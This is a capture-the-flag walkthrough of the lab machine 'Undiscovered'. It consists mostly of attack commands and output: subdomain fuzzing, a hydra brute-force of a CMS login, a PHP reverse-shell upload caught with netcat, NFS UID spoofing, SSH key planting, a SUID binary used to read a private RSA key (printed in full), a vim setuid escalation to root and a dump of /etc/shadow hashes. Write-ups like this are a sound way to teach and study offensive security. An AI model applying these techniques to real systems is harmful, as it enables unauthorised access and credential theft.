# Undiscovered
## Medium
Discovery consists not in seeking new landscapes, but in having new eyes..

## Information Gatherings
```bash
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 61
80/tcp    open  http    syn-ack ttl 61
111/tcp   open  rpcbind syn-ack ttl 61
2049/tcp  open  nfs     syn-ack ttl 61
35125/tcp open  unknown syn-ack ttl 61
```
```bash
nmap -sC -sV 10.201.81.46 -oN nmap_undiscovered
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-06 20:58 WIB
Nmap scan report for 10.201.81.46
Host is up (0.41s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:76:81:49:50:bb:6f:4f:06:15:cc:08:88:01:b8:f0 (RSA)
|   256 2b:39:d9:d9:b9:72:27:a9:32:25:dd:de:e4:01:ed:8b (ECDSA)
|_  256 2a:38:ce:ea:61:82:eb:de:c4:e0:2b:55:7f:cc:13:bc (ED25519)
80/tcp   open  http    Apache httpd 2.4.18
|_http-title: Did not follow redirect to http://undiscovered.thm
|_http-server-header: Apache/2.4.18 (Ubuntu)
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100021  1,3,4      35125/tcp   nlockmgr
|   100021  1,3,4      39378/tcp6  nlockmgr
|   100021  1,3,4      51164/udp6  nlockmgr
|   100021  1,3,4      54012/udp   nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
2049/tcp open  nfs     2-4 (RPC #100003)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.98 seconds

```

## Enumeration
sudo vim /etc/hosts
```bash
10.201.81.46    undiscovered.th
```
In browsers `http://undiscovered.thm/`
```bash
ffuf -u http://undiscovered.thm/ -H "Host:FUZZ.undiscovered.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fw 18

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://undiscovered.thm/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.undiscovered.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 18
________________________________________________


manager
dashboard  
deliver
newsite 
develop 
forms
network 
maintenance 
view 
mailgate
play 
start
booking 
terminal
gold
internet  
resources

```

sudo vim /etc/hosts
```bash
10.201.81.46    undiscovered.thm develop.undiscovered.thm deliver.undiscovered.thm
```
`http://deliver.undiscovered.thm/`

```bash
gobuster dir -u http://deliver.undiscovered.thm -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -t 22 -q /cms/
/media                (Status: 301) [Size: 336] [--> http://deliver.undiscovered.thm/media/]
/templates            (Status: 301) [Size: 340] [--> http://deliver.undiscovered.thm/templates/]
/files                (Status: 301) [Size: 336] [--> http://deliver.undiscovered.thm/files/]
/data                 (Status: 301) [Size: 335] [--> http://deliver.undiscovered.thm/data/]
/cms                  (Status: 301) [Size: 334] [--> http://deliver.undiscovered.thm/cms/]
/js                   (Status: 301) [Size: 333] [--> http://deliver.undiscovered.thm/js/]
```
We Found Ligin Page `http://deliver.undiscovered.thm/cms/`

```bash
 hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  deliver.undiscovered.thm http-post-form \
  "/cms/index.php:username=^USER^&userpw=^PASS^:User unknown or password wrong" \
  -t 8 -f -V

  [80][http-post-form] host: deliver.undiscovered.thm   login: admin   password: liverpool

```
We Found Credentials `login: admin   password: liverpool`
## Exploit
Login with credentials

Go to `http://deliver.undiscovered.thm/cms/index.php?mode=filemanager&action=upload&directory=media`

Using rev.php in menu uploud 
```bash
nc -lvnp 4444 
listening on [any] 4444 ...
connect to [10.9.2.114] from (UNKNOWN) [10.201.81.46] 45270
Linux undiscovered 4.4.0-189-generic #219-Ubuntu SMP Tue Aug 11 12:26:50 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 23:36:47 up  1:45,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```
```bash
www-data@undiscovered:/tmp$ cat /etc/passwd

william:x:3003:3003::/home/william:/bin/bash
leonard:x:1002:1002::/home/leonard:/bin/bash
```
```bash
sudo groupadd -g 3003 william
sudo useradd -u 3003 -g 3003 -m -s /bin/bash william
udo su william
┌──(william㉿kali)-[/home/santstyle/Desktop/THM/Undiscovered]
└─$ 
```
```bash
sudo mount -t nfs undiscovered.thm:/home/william/ /home/william/
```
```bash
sudo su - william
```
```bash
william@kali:~$ ls -la /home/william
total 44
drwxr-x--- 4 william william 4096 Sep  9  2020 .
drwxr-xr-x 4 root    root    4096 Oct  6 23:05 ..
-rwxr-xr-x 1 root    root     128 Sep  4  2020 admin.sh
-rw------- 1 root    root       0 Sep  9  2020 .bash_history
-rw-r--r-- 1 william william 3771 Sep  4  2020 .bashrc
drwx------ 2 william william 4096 Sep  4  2020 .cache
drwxrwxr-x 2 william william 4096 Sep  4  2020 .nano
-rw-r--r-- 1 william william   43 Sep  4  2020 .profile
-rwsrwsr-x 1 nobody  nogroup 8776 Sep  4  2020 script
-rw-r----- 1 root    william   38 Sep  9  2020 user.txt
```
## Root Privilege Escalation
```bash

PUB="$(cat william.pub)"
sudo -u william bash -c 'mkdir -p /home/william/.ssh && printf "%s\n" "'"$PUB"'" > /home/william/.ssh/authorized_keys && chmod 600 /home/william/.ssh/authorized_keys && chmod 700 /home/william/.ssh'


s -lan /home/william /home/william/.ssh /home/william/.ssh/authorized_keys
sudo -u william cat /home/william/.ssh/authorized_keys

ls: cannot access '/home/william/.ssh': Permission denied
ls: cannot access '/home/william/.ssh/authorized_keys': Permission denied
ls: cannot open directory '/home/william': Permission denied
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINia04/M02gQKZ1kC1Dea25EK0Mc+GlgJPOQQ8dSPdSB santstyle@kali
chmod 600 ./william
ls -l ./william

-rw------- 1 santstyle santstyle 411 Oct  6 23:44 ./william

ssh -i ./william -o IdentitiesOnly=yes -o StrictHostKeyChecking=no william@undiscovered.thm

Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-189-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


0 packages can be updated.
0 updates are security updates.


Last login: Thu Sep 10 00:35:09 2020 from 192.168.0.147
william@undiscovered:~$ ./script /.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----                                                                                  
MIIEogIBAAKCAQEAwErxDUHfYLbJ6rU+r4oXKdIYzPacNjjZlKwQqK1I4JE93rJQ                                                 
HEhQlurt1Zd22HX2zBDqkKfvxSxLthhhArNLkm0k+VRdcdnXwCiQqUmAmzpse9df                                                 
YU/UhUfTu399lM05s2jYD50A1IUelC1QhBOwnwhYQRvQpVmSxkXBOVwFLaC1AiMn                                                 
SqoMTrpQPxXlv15Tl86oSu0qWtDqqxkTlQs+xbqzySe3y8yEjW6BWtR1QTH5s+ih                                                 
hT70DzwhCSPXKJqtPbTNf/7opXtcMIu5o3JW8Zd/KGX/1Vyqt5ememrwvaOwaJrL                                                 
+ijSn8sXG8ej8q5FidU2qzS3mqasEIpWTZPJ0QIDAQABAoIBAHqBRADGLqFW0lyN                                                 
C1qaBxfFmbc6hVql7TgiRpqvivZGkbwGrbLW/0Cmes7QqA5PWOO5AzcVRlO/XJyt                                                 
+1/VChhHIH8XmFCoECODtGWlRiGenu5mz4UXbrVahTG2jzL1bAU4ji2kQJskE88i                                                 
72C1iphGoLMaHVq6Lh/S4L7COSpPVU5LnB7CJ56RmZMAKRORxuFw3W9B8SyV6UGg                                                 
Jb1l9ksAmGvdBJGzWgeFFj82iIKZkrx5Ml4ZDBaS39pQ1tWfx1wZYwWw4rXdq+xJ
xnBOG2SKDDQYn6K6egW2+aNWDRGPq9P17vt4rqBn1ffCLtrIN47q3fM72H0CRUJI
Ktn7E2ECgYEA3fiVs9JEivsHmFdn7sO4eBHe86M7XTKgSmdLNBAaap03SKCdYXWD
BUOyFFQnMhCe2BgmcQU0zXnpiMKZUxF+yuSnojIAODKop17oSCMFWGXHrVp+UObm
L99h5SIB2+a8SX/5VIV2uJ0GQvquLpplSLd70eVBsM06bm1GXlS+oh8CgYEA3cWc
TIJENYmyRqpz3N1dlu3tW6zAK7zFzhTzjHDnrrncIb/6atk0xkwMAE0vAWeZCKc2
ZlBjwSWjfY9Hv/FMdrR6m8kXHU0yvP+dJeaF8Fqg+IRx/F0DFN2AXdrKl+hWUtMJ
iTQx6sR7mspgGeHhYFpBkuSxkamACy9SzL6Sdg8CgYATprBKLTFYRIUVnZdb8gPg
zWQ5mZfl1leOfrqPr2VHTwfX7DBCso6Y5rdbSV/29LW7V9f/ZYCZOFPOgbvlOMVK
3RdiKp8OWp3Hw4U47bDJdKlK1ZodO3PhhRs7l9kmSLUepK/EJdSu32fwghTtl0mk
OGpD2NIJ/wFPSWlTbJk77QKBgEVQFNiowi7FeY2yioHWQgEBHfVQGcPRvTT6wV/8
jbzDZDS8LsUkW+U6MWoKtY1H1sGomU0DBRqB7AY7ON6ZyR80qzlzcSD8VsZRUcld
sjD78mGZ65JHc8YasJsk3br6p7g9MzbJtGw+uq8XX0/XlDwsGWCSz5jKFDXqtYM+
cMIrAoGARZ6px+cZbZR8EA21dhdn9jwds5YqWIyri29wQLWnKumLuoV7HfRYPxIa
bFHPJS+V3mwL8VT0yI+XWXyFHhkyhYifT7ZOMb36Zht8yLco9Af/xWnlZSKeJ5Rs
LsoGYJon+AJcw9rQaivUe+1DhaMytKnWEv/rkLWRIaiS+c9R538=
-----END RSA PRIVATE KEY-----
```
```bash
ssh -i leonard leonard@undiscovered.thm
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-189-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


0 packages can be updated.
0 updates are security updates.


Last login: Fri Sep  4 22:57:43 2020 from 192.168.68.129
leonard@undiscovered
```
```bash
leonard@undiscovered:~$ /usr/bin/vim.basic -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
^[[2;2RErase is control-H (^H).
/bin/bash -p
root@undiscovered:~# ls 
root@undiscovered:~# ls -la
total 40
drwxr-x--- 5 leonard leonard  4096 Oct  7 01:22 .
drwxr-xr-x 4 root    root     4096 Sep  4  2020 ..
-rw------- 1 root    root        0 Sep  9  2020 .bash_history
-rw-r--r-- 1 leonard leonard  3771 Sep  4  2020 .bashrc
drwx------ 2 leonard leonard  4096 Sep  4  2020 .cache
drwxrwxr-x 2 leonard leonard  4096 Sep  4  2020 .nano
-rw-r--r-- 1 leonard leonard    43 Sep  4  2020 .profile
drwx------ 2 leonard leonard  4096 Sep  4  2020 .ssh
-rw------- 1 leonard leonard 10845 Oct  7 01:22 .viminfo
root@undiscovered:~# cd /root
root@undiscovered:/root# ls
root.txt
root@undiscovered:/root# cat root.txt
  _    _           _ _                                     _ 
 | |  | |         | (_)                                   | |
 | |  | |_ __   __| |_ ___  ___ _____   _____ _ __ ___  __| |
 | |  | | '_ \ / _` | / __|/ __/ _ \ \ / / _ \ '__/ _ \/ _` |
 | |__| | | | | (_| | \__ \ (_| (_) \ V /  __/ | |  __/ (_| |
  \____/|_| |_|\__,_|_|___/\___\___/ \_/ \___|_|  \___|\__,_|
      
             THM{8d7b7299cccd1796a61915901d0e091c}
```
```bash
# cat /etc/shadow
root:$6$1VMGCoHv$L3nX729XRbQB7u3rndC.8wljXP4eVYM/SbdOzT1IET54w2QVsVxHSH.ghRVRxz5Na5UyjhCfY6iv/koGQQPUB0:18508:0:99999:7:::
daemon:*:18484:0:99999:7:::
bin:*:18484:0:99999:7:::
sys:*:18484:0:99999:7:::
sync:*:18484:0:99999:7:::
games:*:18484:0:99999:7:::
man:*:18484:0:99999:7:::
lp:*:18484:0:99999:7:::
mail:*:18484:0:99999:7:::
news:*:18484:0:99999:7:::
uucp:*:18484:0:99999:7:::
proxy:*:18484:0:99999:7:::
www-data:*:18484:0:99999:7:::
backup:*:18484:0:99999:7:::
list:*:18484:0:99999:7:::
irc:*:18484:0:99999:7:::
gnats:*:18484:0:99999:7:::
nobody:*:18484:0:99999:7:::
systemd-timesync:*:18484:0:99999:7:::
systemd-network:*:18484:0:99999:7:::
systemd-resolve:*:18484:0:99999:7:::
systemd-bus-proxy:*:18484:0:99999:7:::
syslog:*:18484:0:99999:7:::
_apt:*:18484:0:99999:7:::
lxd:*:18508:0:99999:7:::
messagebus:*:18508:0:99999:7:::
uuidd:*:18508:0:99999:7:::
dnsmasq:*:18508:0:99999:7:::
sshd:*:18508:0:99999:7:::
mysql:!:18509:0:99999:7:::
statd:*:18509:0:99999:7:::
william:$6$Nxvi9UI5$h.yTVQCnXbfZ7BZT1sZnl4NHF074.uYC9o.1t61vSfHTJTdVBrdxib/QKXUlyOUkjk6FqusGuxCSIlJJsFyfY/:18509:0:99999:7:::
leonard:$6$mOYLO55O$oUzIfZpklQj8M4rumAa5UJWoA1KXBYEsQGAdtJliuJDvSAwweQdGi8bgbz.dDVZ63jUc/UX3/VXRwpCkEI5rQ/:18509:0:99999:7:::
nfsnobody:!:18510:0:99999:7:::
```
`Finnaly`
